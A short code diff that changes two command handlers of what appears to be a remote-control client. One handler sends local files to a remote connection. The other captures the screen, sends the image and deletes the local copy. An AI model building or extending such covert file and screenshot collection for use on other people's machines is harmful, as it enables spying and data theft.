@@ -175,6 +175,7 @@ class Command:
     def download(filename, _instance):
         if os.path.isfile(filename):
             id, conn = _instance
+            conn.send_result(id, 1, 'Preparing to send file', eof=0)
             conn.send_file(id, filename)
         else:
             return 0, 'File does not exist'
@@ -201,9 +202,10 @@ class Command:
     @desc('grab a screenshot')
     def screenshot(_instance):
         import pyautogui
+        id, conn = _instance
         filename = 'screenshot_{}.png'.format(get_time())
         pyautogui.screenshot(filename)
-        id, conn = _instance
+        conn.send_result(id, 1, 'Screenshot success', eof=0)
         conn.send_file(id, filename)
         os.remove(filename)
 
